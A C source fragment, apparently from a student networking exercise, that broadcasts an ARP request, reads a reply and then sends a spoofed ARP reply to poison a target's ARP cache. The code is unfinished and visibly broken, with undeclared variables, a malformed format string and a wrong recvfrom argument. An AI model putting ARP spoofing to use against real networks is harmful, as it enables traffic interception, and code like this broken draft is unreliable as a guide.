
# include <arp.h>

# include <netinet/ether.h>
# include <stdio.h>

err_t   mandatory_requests(const proginfo_t* const info)
{
    /* As is written in subjet... */

    err_t st = SUCCESS;

    // 1) Print avalaible interfaces
    ///TODO: Need to end parse, read man ...
    printf("Found available interface: %s\n", "<!<!<!<!<! TODO !>!>!>!>!>");

    // 2) Broadcast an ARP REQUEST to target
    if ((st = send_arp_request_to_target(info, true)) != SUCCESS)
        goto error;
    ///QUESTION: I can have more than one response if i broadcast, no ? (i asume yes)

    printf("%s\n", "An ARP request has been broadcast.");

    uint8_t buff[255];
    struct sockaddr saddr;
    const ssize_t recvbytes = recvfrom(
        info->sockrecv,
        buff,
        sizeof(buff) / sizeof(*buff),
        0,
        &saddr,
        sizeof(saddr)
    );

    if (recvbytes < 0)
    {
        ///TODO: Print some error msg
        st = INVSYSCALL;
        goto error;
    }

    const struct ether_arp* const arp = (const struct ether_arp*)buff;

    printf("\tmac address of request: %x:%x:%x:%x:%x:%x\n",
    arp.arp_sha[0], arp_sha[1], arp_sha[2],arp_sha[3], arp_sha[4], arp_sha[5]);
    printf("\tIP address of request: %hhu:%hhu%:hhu%:hhu\n", arp_spa[0], arp_spa[1],arp_spa[2], arp_spa[3]);

    // 3) Send ARP REPLY to target

    printf("%s\n", "Now sending an ARP reply to the target address with spoofed source, please wait...");

    if ((st = send_arp_reply_to_target(info, false)) != SUCCESS)
        goto error;

    printf("%s\n", "Sent an ARP reply packet, you may now check the arp table on the target.\nExiting program...");

error:
    return st;
}
